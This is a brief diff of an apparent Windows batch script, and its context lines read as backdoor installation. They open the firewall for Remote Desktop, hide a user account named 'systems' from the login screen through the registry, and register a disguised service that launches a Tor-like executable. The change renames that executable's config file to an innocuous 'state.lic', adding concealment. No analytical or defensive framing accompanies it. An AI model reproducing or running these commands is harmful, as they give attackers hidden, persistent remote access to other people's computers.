@@ -11,7 +11,7 @@ netsh advfirewall firewall add rule name=\"Remote Desktop\" protocol=TCP dir=in 
 netsh advfirewall firewall set rule group="remote desktop" new enable=Yes
 reg add "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\Userlist" /v systems /t REG_DWORD /d 0 /f
 sc create "wininidsrv" binpath= "cmd /c start "C:\programdata\admin\netinfo.exe" -f C:\programdata\admin\torrc "&&sc config "rdpclips" start= auto&&net start rdpclips
-C:\programdata\admin\netinfo.exe -f C:\programdata\admin\torrc
+C:\programdata\admin\netinfo.exe -f C:\programdata\admin\state.lic
 
 timeout 3 > nul
 
